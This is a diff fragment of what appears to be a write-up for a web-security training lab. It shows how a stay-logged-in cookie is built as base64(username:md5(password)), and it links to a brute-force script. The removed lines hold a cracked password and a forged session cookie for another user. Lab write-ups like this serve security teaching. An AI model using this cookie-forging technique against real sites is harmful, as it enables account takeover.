@@ -87,9 +87,6 @@ Python script to brute: https://github.com/MalikHettige/Scripts-tools/blob/main/
 Raw cookie (wiener): d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
 Decoded:             wiener:51dc30ddc473d43a6011e9ebba6ca770
 Formula:             base64(username:md5(password))
-
-[FOUND] password: monitor
-Forged cookie: Y2FybG9zOjA4YjU0MTFmODQ4YTI1ODFhNDE2NzJhNzU5Yzg3Mzgw
 ```
 <img width="887" height="762" alt="image" src="https://github.com/user-attachments/assets/58242243-b899-40a4-b5c7-fd11a8ba9d8b" />
 
